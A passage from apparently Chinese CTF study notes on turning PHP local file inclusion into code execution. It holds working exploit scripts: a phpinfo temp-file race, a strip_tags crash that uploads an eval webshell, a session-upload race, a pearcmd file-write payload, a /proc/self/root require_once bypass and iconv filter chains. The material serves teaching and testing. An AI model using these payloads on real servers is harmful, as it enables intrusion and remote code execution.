class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">&quot;0\r\n\r\n&quot;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;No php tmp_name in phpinfo output&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;found %s at %i&quot;</span> % (d[i:i + <span class="number">10</span>], i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i + <span class="number">256</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;LFI With PHPInfo()&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;-=&quot;</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port = <span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    poolsz = <span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = <span class="built_in">int</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Getting initial offset...&quot;</span>,</span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write(<span class="string">&quot;\r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Woot!  \m/&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;:(&quot;</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\nTelling threads to shutdown...&quot;</span></span><br><span class="line">        e.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="lfiphp7-collapse"><a class="markdownIt-Anchor" href="#lfiphp7-collapse">#</a> LFI+php7 collapse</h2>
+<p>php 7.0-7.1.19</p>
+<p>当不存在 phpinfo 时，可以利用 php7 的特性</p>
+<p><code>http://ip/index.php?file=php://filter/string.strip_tags=/etc/passwd</code>  导致 php 崩溃，临时文件遗留了下来</p>
+<p>在上传时抓包，使用以上 payload 进行崩溃</p>
+<p>接下来需要找到刚刚的临时文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = @$_GET[&#x27;dir&#x27;];</span><br><span class="line">if(!$a)&#123;</span><br><span class="line">$a = &#x27;/tmp&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure>
+<p>然后写 shell 包含随便搞</p>
+<p>两种崩溃方法：</p>
+<p>抓包时修改</p>
+<p>先写个文件上传页面，上传时抓包，修改 url 和文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">POST /upload_file.php?file=php://filter/read=convert.base64-encode/resource=index.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:18888</span><br><span class="line">Content-Length: 290</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;97&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://127.0.0.1:18888</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6O4h5F4Qzy538QaC</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://127.0.0.1:18888/file_upload.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=9pji5c42u9migge868i8u083r7; ZDEDebuggerPresent=php,phtml,php3</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary6O4h5F4Qzy538QaC</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;123.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">------WebKitFormBoundary6O4h5F4Qzy538QaC</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">提交</span><br><span class="line">------WebKitFormBoundary6O4h5F4Qzy538QaC--</span><br></pre></td></tr></table></figure>
+<p>写 python 包崩溃</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line">import re</span><br><span class="line">files = &#123;</span><br><span class="line">  &#x27;file&#x27;: BytesIO(&#x27;&lt;?php eval($_REQUEST[sky]);&#x27;)</span><br><span class="line">&#125;</span><br><span class="line">url = &#x27;http://ip/index.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span><br><span class="line">try:</span><br><span class="line">r = requests.post(url=url, files=files, allow_redirects=False)</span><br><span class="line">except:</span><br><span class="line">url = &#x27;http://ip/dir.php&#x27;</span><br><span class="line">r = requests.get(url)</span><br><span class="line">data = re.search(r&quot;php[a-zA-Z0-9]&#123;1,&#125;&quot;, r.content).group(0)</span><br><span class="line">url = &quot;http://ip/index.php?file=/tmp/&quot;+data</span><br><span class="line">data = &#123;</span><br><span class="line">&#x27;sky&#x27;:&quot;readfile(&#x27;/flag&#x27;);&quot;</span><br><span class="line">&#125;</span><br><span class="line">r =  requests.post(url=url,data=data)</span><br><span class="line">print r.content</span><br></pre></td></tr></table></figure>
+<h2 id="docker中文件包含"><a class="markdownIt-Anchor" href="#docker中文件包含">#</a> docker 中文件包含</h2>
+<p>1. 包含日志文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">access.log -&gt; /dev/stdout</span><br><span class="line">error.log -&gt; /dev/stderr</span><br></pre></td></tr></table></figure>
+<p>此时日志被重定向到标准输出中，不能包含</p>
+<p>此时包含这些 Web 日志会出现 <code>include(/dev/pts/0): failed to open stream: Permission denied</code>  的错误，因为 PHP 没有权限包含设备文件：</p>
+<p>远程包含因为默认不开启，所以我们也不作为一个候选项，想要 getshell 还是需要找到一个可以控制内容的文件进行包含。</p>
+<p>2.phpinfo 文件包含</p>
+<p>同样 post 一个大文件，然后利用时间竞争</p>
+<p>脚本和之前的脚本类似，但更改了切片的位置</p>
+<p><code>fn = d[i+17:i+31]</code></p>
+<p>3.Windows 中通配符</p>
+<p>在临时文件包含中，我们详细讲过通配符</p>
+<ul>
+<li>DOS_STAR：即  <code>&lt;</code> ，匹配 0 个以上的字符</li>
+<li>DOS_QM：即 <code>&gt;</code> ，匹配 1 个字符</li>
+<li>DOS_DOT：即 <code>&quot;</code> ，匹配点号</li>
+</ul>
+<p>有了通配符，我们就可以匹配临时文件，并修改其内容</p>
+<p>一般我们会用 fputs 和 fopen 写到临时文件中，这样临时文件即使删除，我们可以将我们的马写到其他的目录中</p>
+<p>4.session.upload_progress</p>
+<p>php version &gt; 7</p>
+<p>session.auto_start 顾名思义，如果开启这个选项，则 PHP 在接收请求的时候会自动初始化 Session，不再需要执行 session_start ()。但默认情况下，也是通常情况下，这个选项都是关闭的。</p>
+<p>session.upload_progress 最初是 PHP 为上传进度条设计的一个功能，在上传文件较大的情况下，PHP 将进行流式上传，并将进度信息放在 Session 中（包含用户可控的值），即使此时用户没有初始化 Session，PHP 也会自动初始化 Session。</p>
+<p>PHP 在开启了 <code>session.upload_progress.enable</code>  后（在包括 Docker 的大部分环境下默认是开启的），将会把用户上传文件的信息保存在 Session 中，而 PHP 的 Session 默认是保存在文件里的。</p>
+<p>利用条件：</p>
+<ul>
+<li>目标环境开启了 <code>session.upload_progress.enable</code>  选项</li>
+<li>发送一个文件上传请求，其中包含一个文件表单和一个名字是 <code>PHP_SESSION_UPLOAD_PROGRESS</code>  的字段</li>
+<li>请求的 Cookie 中包含 Session ID</li>
+</ul>
+<p>构造如下上传包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">	&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php phpinfo(); ?&gt;&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>上传抓包时设置 cookie: PHPSESSID=hahaha</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">POST /web10.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:18888</span><br><span class="line">Content-Length: 426</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;97&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://127.0.0.1:18888</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfiKjPC47H7ESbbdB</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://127.0.0.1:18888/file_upload.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=2333333; ZDEDebuggerPresent=php,phtml,php3</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryfiKjPC47H7ESbbdB</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;123.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">nishishabi</span><br><span class="line">------WebKitFormBoundaryfiKjPC47H7ESbbdB</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html PUBLIC </span><br><span class="line">------WebKitFormBoundaryfiKjPC47H7ESbbdB</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">提交</span><br><span class="line">------WebKitFormBoundaryfiKjPC47H7ESbbdB--</span><br></pre></td></tr></table></figure>
+<p>上传后我们可以控制文件名，就是我们的 PHPSESSID，但临时文件内容是空的</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221102153200577.png" alt="image-20221102153200577"></p>
+<p>可见，我在上传文件的同时，POST 了一个名为 PHP_SESSION_UPLOAD_PROGRESS 的字段，其值为 bbbbbbb。（PHP_SESSION_UPLOAD_PROGRESS 是在 php.ini 里定义的 session.upload_progress.name）只要上传包里带上这个键，PHP 就会自动启用 Session，又因为我在 Cookie 中设置了 PHPSESSID=aaaaaaa，所以 Session 文件将会自动创建。</p>
+<p>但它的大小为什么是 0 呢？因为上传结束后，这个 Session 将会被自动清除（由 session.upload_progress.cleanup 定义），我们只需要条件竞争，赶在文件被清除前利用即可。</p>
+<p>通过竞争实现删除之前包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">sessid = &#x27;23333&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def t1(session):</span><br><span class="line">    while True:</span><br><span class="line">        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)</span><br><span class="line">        response = session.post(</span><br><span class="line">            &#x27;http://127.0.0.1:18888/file_upload.php&#x27;,</span><br><span class="line">            data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?=phpinfo()?&gt;&#x27;&#125;,</span><br><span class="line">            files=&#123;&#x27;file&#x27;: (&#x27;a.txt&#x27;, f)&#125;,</span><br><span class="line">            cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def t2(session):</span><br><span class="line">    while True:</span><br><span class="line">        response = session.get(f&#x27;http://192.168.1.7/xss_location/include/session_upload.php?file=C:/windows/sess_&#123;sessid&#125;&#x27;)</span><br><span class="line">        print(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with requests.session() as session:</span><br><span class="line">    t1 = threading.Thread(target=t1, args=(session,))</span><br><span class="line">    t1.daemon = True</span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    t2(session)</span><br></pre></td></tr></table></figure>
+<p><code>&lt;?=phpinfo();?&gt;</code>   可以改为写文件，在自定义的路径下写文件，然后在包含，这样无需解决路径和文件名的问题</p>
+<p>5. 通过 string.strip-tag 导致 php 崩溃</p>
+<p>在 docker 中也是可以用的，具体看上面</p>
+<p>6.pearcmd.php</p>
+<p>pecl 是 PHP 中用于管理扩展而使用的命令行工具，而 pear 是 pecl 依赖的类库。在 7.3 及以前，pecl/pear 是默认安装的；在 7.4 及以后，需要我们在编译 PHP 的时候指定 <code>--with-pear</code>  才会安装。</p>
+<p>不过，在 Docker 任意版本镜像中，pcel/pear 都会被默认安装，安装的路径在 <code>/usr/local/lib/php</code> 。</p>
+<p>Docker 环境下的 PHP 会开启 <code>register_argc_argv</code>  这个配置。当开启了这个选项，用户的输入将会被赋予给 <code>$argc</code> 、 <code>$argv</code> 、 <code>$_SERVER['argv']</code>  几个变量。</p>
+<p>这意味着，HTTP 数据包中的 query-string 会被作为 argv 的值</p>
+<p><code>[PHP 7.3.33 - phpinfo()](http://127.0.0.1:18888/phpinfo.php?uuuuuuu)</code></p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221102164711562.png" alt="image-20221102164711562"></p>
+<p>如果 query-string 中不包含没有编码的 <code>=</code> ，且请求是 GET 或 HEAD，则 query-string 需要被作为命令行参数。</p>
+<p>PHP 现在仍然没有严格按照 RFC 来处理，即使我们传入的 query-string 包含等号，也仍会被赋值给 <code>$_SERVER['argv']</code> 。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">D:\xampp\php&gt;php.exe pear/pearcmd.php</span><br><span class="line">Commands:</span><br><span class="line">build                  Build an Extension From C Source</span><br><span class="line">bundle                 Unpacks a Pecl Package</span><br><span class="line">channel-add            Add a Channel</span><br><span class="line">channel-alias          Specify an alias to a channel name</span><br><span class="line">channel-delete         Remove a Channel From the List</span><br><span class="line">channel-discover       Initialize a Channel from its server</span><br><span class="line">channel-info           Retrieve Information on a Channel</span><br><span class="line">channel-login          Connects and authenticates to remote channel server</span><br><span class="line">channel-logout         Logs out from the remote channel server</span><br><span class="line">channel-update         Update an Existing Channel</span><br><span class="line">clear-cache            Clear Web Services Cache</span><br><span class="line">config-create          Create a Default configuration file</span><br></pre></td></tr></table></figure>
+<p>create-config 是可以创建文件的，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>
+<p>因此我们最终构造的 payload 如下 <code>GET /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php HTTP/1.1</code></p>
+<p>简单解释一下，这里的 config-create 会被当做命令行参数执行，执行的第一个参数是要写的文件内容，第二个参数是稳健位置，然后在通过包含即可</p>
+<p>这个好就好在，docker 下的 php 默认都是开这个选项的，而且不用时间竞争，而且路径文件名可控，即使不是 docker 下，仍可以尝试，万一人家要安装依赖没关呢</p>
+<h2 id="通过多级软链接绕过require_once"><a class="markdownIt-Anchor" href="#通过多级软链接绕过require_once">#</a> 通过多级软链接绕过 require_once</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php require_once &#x27;/www/config.php&#x27;; // some logic here... </span><br><span class="line">	  require_once $_GET[&#x27;file&#x27;]; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>如果我们想要读取 /www/config.php 中的文件，通常可以通过 php://filter 来读取，比如 <code>1.1.1.1/a.php?file=php://filter/read=convert.base64-encode/resource=/www/config.php</code> ，但但如果这个文件在前面已经被包含过了，则第二次包含就会失败，即使使用 php://filter 也一样。</p>
+<p>正常情况下，PHP 会将用户输入的文件名进行 resolve，转换成标准的绝对路径，这个转换的过程会将…/、./、软连接等都进行计算，得到一个最终的路径，再进行包含。每次包含都会经历这个过程，所以，只要是相同的文件，不管中间使用了…/ 进行跳转，还是使用软连接进行跳转，都逃不过最终被转换成原始路径的过程，也就绕不过 require_once。</p>
+<p>但是，如果软连接跳转的次数超过了某一个上限，Linux 的 lstat 函数就会出错，导致 PHP 计算出的绝对路径就会包含一部分软连接的路径，也就和原始路径不相同的，即可绕过 require_once 限制。</p>
+<p><code>/proc/self</code>  指向当前进程的 <code>/proc/pid/</code> ， <code>/proc/self/root/</code>  是指向 <code>/</code>  的符号链接，在 Linux 下，最常见的软连接就是 /proc/self/root，这个路径指向根目录。所以，我们可以多次使用这个路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once &#x27;/www/config.php&#x27;;</span><br><span class="line">include_once &#x27;/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/www/config.php&#x27;;</span><br></pre></td></tr></table></figure>
+<h2 id="hxp-ctf"><a class="markdownIt-Anchor" href="#hxp-ctf">#</a> hxp ctf</h2>
+<h3 id="the-end-of-lfi"><a class="markdownIt-Anchor" href="#the-end-of-lfi">#</a> the end of LFI</h3>
+<p>在 PHP 中，我们可以利用 PHP Base64 Filter 宽松的解析，通过 iconv filter 等编码组合构造出特定的 PHP 代码进而完成无需<strong>临时文件</strong>的 RCE 。</p>
+<p>前置知识 0x00</p>
+<p>php://filter ，当使用 base64-decode 时，字符 &lt;、?、;、&gt;、空格等一共有 7 个字符不符合 base64 编码的字符范围将被忽略，而合法字符将被正常解码，我们的正常字符包括 <code>A-Za-z0-9\/\=\+</code> 。同时需要注意，base64 在编码的时候是四个字节为一组的，这个在上面 session 包含中有过详细解释</p>
+<p>举个师傅的例子:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;\x1bY\xffQ\xfa&quot;;              //YQ 为 a 的 base64 编码</span><br><span class="line">var_dump(base64_decode($a));</span><br><span class="line"></span><br><span class="line">// string(1) &quot;a&quot;</span><br></pre></td></tr></table></figure>
+<p>很明显，我们的不可见字符，控制字符也被忽略了</p>
+<p><strong>因此我们可以使用 base64 先 decode 在 incode 来去除 base64 不认可的非法字符，这是我们后面做题的基础</strong></p>
+<p>前置知识 0x01 包含文件中的 php 代码</p>
+<p>假如我们有一个文件 e，文件中的内容是：PD9waHAgcGhwaW5mbygpOw==，即 <code>&lt;?php phpinfo();</code>  的 base64 编码，我们有两种方式包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include &quot;php://filter/convert.base64-decode/resource=./e&quot;;</span><br><span class="line">include &quot;php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOw==&quot;;</span><br></pre></td></tr></table></figure>
+<p><code>include</code>  函数实际包含的是 Base64 解码后的 PHP 代码。</p>
+<p>前置知识 0x02 convert.iconv</p>
+<p>PHP Filter 当中有一种  <code>convert.iconv</code>  的 Filter ，可以用来将数据从字符集 A 转换为字符集 B ，其中这两个字符集可以从  <code>iconv -l</code>  获得，这个字符集比较长，不过也存在一些实际上是其他字符集的别名。</p>
+<p>举个例子，我们可以从 utf8 转换为 utf7 的编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some&lt;&gt;text&quot;;</span><br><span class="line">echo file_get_contents($url);</span><br><span class="line">// Output:</span><br><span class="line">// some+ADwAPg-text</span><br></pre></td></tr></table></figure>
+<p>可以看到，我们在转换的同时成了一些其他的字符，比如 <code>+ADwAPg-</code></p>
+<p>这样结合我们的 base64 的 decode 忽略非法字符，和文件内容包含，也许可以直接转换出我们的 webshell</p>
+<p>比如我们可以通过 UTF8 转 CSISO2022KR 得到字符 C：</p>
